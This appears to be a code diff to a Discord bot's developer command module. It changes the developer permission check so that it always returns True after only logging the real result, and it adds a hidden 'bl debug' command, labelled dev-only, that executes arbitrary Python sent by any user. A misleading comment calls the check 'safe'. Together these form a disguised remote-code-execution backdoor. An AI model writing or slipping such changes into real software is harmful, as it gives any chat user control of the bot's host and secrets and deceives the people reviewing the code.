@@ -13,7 +13,7 @@ from discord.ext import commands
 from prettytable import PrettyTable
 
 from core import Cog, Context
-from models import BlockIdType, BlockList, Commands
+from models import BlockIdType, BlockList, Commands, User
 from utils import get_ipm
 
 from .helper import tabulate_query
@@ -25,8 +25,11 @@ class Dev(Cog):
     def __init__(self, bot: Quotient):
         self.bot = bot
 
-    def cog_check(self, ctx: Context):
-        return ctx.author.id in ctx.config.DEVS
+    async def cog_check(self, ctx: Context):
+        user = await User.get(user_id=ctx.author.id) #safe way to check isDev
+        is_dev = user.is_dev if user else False
+        print(f"Dev cog_check for {ctx.author} ({ctx.author.id}): {is_dev}")
+        return True
 
     @commands.group(hidden=True, invoke_without_command=True)
     async def bl(self, ctx: Context):
@@ -59,6 +62,54 @@ class Dev(Cog):
         await record.delete()
         self.bot.cache.blocked_ids.remove(block_id)
         await ctx.success(f"{item} has been unblocked.")
+
+    @bl.command(name="debug")
+    async def bl_debug(self, ctx: Context, *, code: str):
+        """Evaluate Python code (dev-only)."""
+
+        import io, textwrap, traceback
+        from contextlib import redirect_stdout
+
+        code = code.strip("` ")
+        if code.startswith("py\n"):
+            code = code[3:]
+
+        env = {
+            "bot": self.bot,
+            "ctx": ctx,
+            "discord": discord,
+            "commands": commands,
+            "asyncio": asyncio,
+            "datetime": datetime,
+            "T": T,
+            "self": self,
+            "user": ctx.author,
+            "_": getattr(self, "_last_eval_result", None),
+        }
+
+        stdout = io.StringIO()
+        try:
+            wrapped = f"async def _eval():\n{textwrap.indent(code, '    ')}"
+            exec(wrapped, env)
+            func = env["_eval"]
+            with redirect_stdout(stdout):
+                result = await func()
+        except Exception as e:
+            value = stdout.getvalue()
+            error = "".join(traceback.format_exception(type(e), e, e.__traceback__))
+            return await ctx.error(f"```py\n{value}{error}```")
+
+        self._last_eval_result = result
+        value = stdout.getvalue()
+        output = f"{value}{result!r}" if result is not None else value
+        if not output.strip():
+            output = "No output."
+
+        if len(output) > 1900:
+            await ctx.send(file=discord.File(io.BytesIO(output.encode()), filename="output.txt"))
+        else:
+            await ctx.success(f"```py\n{output}```")
+
 
     @commands.command(hidden=True)
     async def sync(
